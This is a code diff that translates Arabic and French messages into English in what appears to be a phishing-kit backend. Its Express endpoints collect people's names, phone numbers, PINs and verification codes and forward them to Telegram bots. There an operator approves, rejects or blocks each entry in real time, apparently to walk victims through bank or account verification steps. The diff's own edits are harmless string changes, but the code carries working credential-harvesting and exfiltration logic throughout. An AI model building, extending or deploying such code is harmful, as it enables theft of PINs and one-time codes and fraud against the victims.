@@ -76,7 +76,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
     } catch (err) {
-        console.error('خطأ تيليغرام:', err.response?.data || err.message);
+        console.error('Telegram error:', err.response?.data || err.message);
     }
 }
 
@@ -99,7 +99,7 @@ async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard 
             text,
             parse_mode: 'Markdown'
         };
-        // null / vide = supprime les boutons
+        // null / empty = remove buttons
         payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };
 
         await axios.post(
@@ -124,12 +124,12 @@ async function setWebhook(bot, retries = 5) {
                 { params: { url: webhookUrl, drop_pending_updates: false } }
             );
             if (data.ok) {
-                console.log(`✅ تم إعداد الويبهوك لـ ${bot.botId}: ${webhookUrl}`);
+                console.log(`✅ Webhook set for ${bot.botId}: ${webhookUrl}`);
                 return;
             }
             throw new Error(JSON.stringify(data));
         } catch (err) {
-            console.error(`❌ المحاولة ${i + 1} فشلت لـ ${bot.botId}:`,
+            console.error(`❌ Attempt ${i + 1} failed for ${bot.botId}:`,
                 err.response?.data || err.message);
             await new Promise(r => setTimeout(r, 3000));
         }
@@ -171,10 +171,10 @@ app.post('/submit-pin', (req, res) => {
     requestBotMap[requestId] = botId;
     persist();
 
-    sendTelegramMessage(bot, `🔐 التحقق من رمز PIN\n\nالاسم: ${name}\nالهاتف: ${phone}\nرمز PIN: ${pin}`, [[
-        { text: '✅ رمز PIN صحيح', callback_data: `pin_ok:${requestId}` },
-        { text: '❌ رمز PIN خاطئ', callback_data: `pin_bad:${requestId}` },
-        { text: '🛑 حظر', callback_data: `pin_block:${requestId}` }
+    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
+        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
+        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
     ]]);
 
     res.json({ requestId });
@@ -197,10 +197,10 @@ app.post('/submit-code', (req, res) => {
     requestBotMap[requestId] = botId;
     persist();
 
-    sendTelegramMessage(bot, `🔑 التحقق من الرمز\n\nالاسم: ${name}\nالهاتف: ${phone}\nالرمز: ${code}`, [[
-        { text: '✅ الرمز صحيح', callback_data: `code_ok:${requestId}` },
-        { text: '❌ الرمز خاطئ', callback_data: `code_bad:${requestId}` },
-        { text: '✅ الرمز صحيح + ❌ رمز PIN خاطئ', callback_data: `code_pin:${requestId}` }
+    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
+        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
+        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
+        { text: '✅ Code OK + ❌ Wrong PIN', callback_data: `code_pin:${requestId}` }
     ]]);
 
     res.json({ requestId });
@@ -218,7 +218,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    // Protection double-clic
+    // Double-click protection
     if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
     processedCallbacks.add(cb.id);
     setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);
@@ -232,45 +232,45 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (action === 'pin_ok') {
         approvedPins[requestId] = true;
         persist();
-        feedback = 'تمت الموافقة على رمز PIN ✅';
-        statusLine = '\n\n_✅ تمت الموافقة من قبل المشرف_';
+        feedback = 'PIN approved ✅';
+        statusLine = '\n\n_✅ Approved by admin_';
     } else if (action === 'pin_bad') {
         approvedPins[requestId] = false;
         persist();
-        feedback = 'تم رفض رمز PIN ❌';
-        statusLine = '\n\n_❌ تم الرفض من قبل المشرف_';
+        feedback = 'PIN rejected ❌';
+        statusLine = '\n\n_❌ Rejected by admin_';
     } else if (action === 'pin_block') {
         blockPins[requestId] = true;
         persist();
-        feedback = 'تم حظر المستخدم 🛑';
-        statusLine = '\n\n_🛑 تم حظر المستخدم_';
+        feedback = 'User blocked 🛑';
+        statusLine = '\n\n_🛑 User blocked_';
     } else if (action === 'code_ok') {
         approvedCodes[requestId] = true;
         persist();
-        feedback = 'تمت الموافقة على الرمز ✅';
-        statusLine = '\n\n_✅ تمت الموافقة من قبل المشرف_';
+        feedback = 'Code approved ✅';
+        statusLine = '\n\n_✅ Approved by admin_';
     } else if (action === 'code_bad') {
         approvedCodes[requestId] = false;
         persist();
-        feedback = 'تم رفض الرمز ❌';
-        statusLine = '\n\n_❌ تم الرفض من قبل المشرف_';
+        feedback = 'Code rejected ❌';
+        statusLine = '\n\n_❌ Rejected by admin_';
     } else if (action === 'code_pin') {
         approvedCodes[requestId] = true;
         approvedPins[requestId]  = false;
         persist();
-        feedback = 'تمت الموافقة على الرمز – إعادة إدخال رمز PIN';
-        statusLine = '\n\n_✅ الرمز صحيح — ⚠️ يجب إعادة إدخال رمز PIN_';
+        feedback = 'Code approved – re-enter PIN';
+        statusLine = '\n\n_✅ Code OK — ⚠️ PIN must be re-entered_';
     } else {
-        statusLine = '\n\n_⚠️ إجراء غير معروف_';
+        statusLine = '\n\n_⚠️ Unknown action_';
     }
 
-    // 🔥 Édite le message original : ajoute le statut + SUPPRIME les boutons
+    // 🔥 Edit the original message: append status + REMOVE buttons
     if (messageId && chatId && statusLine) {
         const originalText = cb.message.text || '';
         await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
     }
 
-    if (feedback) await sendTelegramMessage(bot, `📝 الملاحظات:\n${feedback}`);
+    if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
 });
@@ -281,9 +281,9 @@ app.get('/debug/bots', (req, res) => res.json(bots));
 // =====================================================
 //          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
 // =====================================================
-// ⚠️ IMPORTANT : un serveur endormi NE PEUT PAS se réveiller lui-même.
-// Ce self-ping ne fonctionne QUE tant que le process tourne.
-// Utilisez AUSSI un pinger externe (cron-job.org / UptimeRobot) sur /health.
+// ⚠️ IMPORTANT: a sleeping server CANNOT wake itself up.
+// This self-ping only works while the process is running.
+// Also use an external pinger (cron-job.org / UptimeRobot) on /health.
 
 const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000; // 10 minutes
 let keepAliveTimer = null;
@@ -307,7 +307,7 @@ function startKeepAlive() {
     if (keepAliveTimer) clearInterval(keepAliveTimer);
     setTimeout(selfPing, 15 * 1000);
     keepAliveTimer = setInterval(selfPing, KEEPALIVE_INTERVAL_MS);
-    console.log('🩺 تم تشغيل Keep-alive (ping كل 10 دقائق)');
+    console.log('🩺 Keep-alive started (ping every 10 min)');
 }
 
 // =====================================================
@@ -322,7 +322,7 @@ process.on('unhandledRejection', (reason) => {
 });
 
 process.on('SIGTERM', () => {
-    console.log('🛑 تم استلام SIGTERM، إيقاف نظيف...');
+    console.log('🛑 SIGTERM received, shutting down cleanly...');
     if (keepAliveTimer) clearInterval(keepAliveTimer);
     process.exit(0);
 });
@@ -330,7 +330,7 @@ process.on('SIGTERM', () => {
 // ---------------- START SERVER ----------------
 setAllWebhooks().then(() => {
     app.listen(PORT, () => {
-        console.log(`🚀 تم تشغيل الخادم على المنفذ ${PORT}`);
+        console.log(`🚀 Server started on port ${PORT}`);
         startKeepAlive();
     });
 });
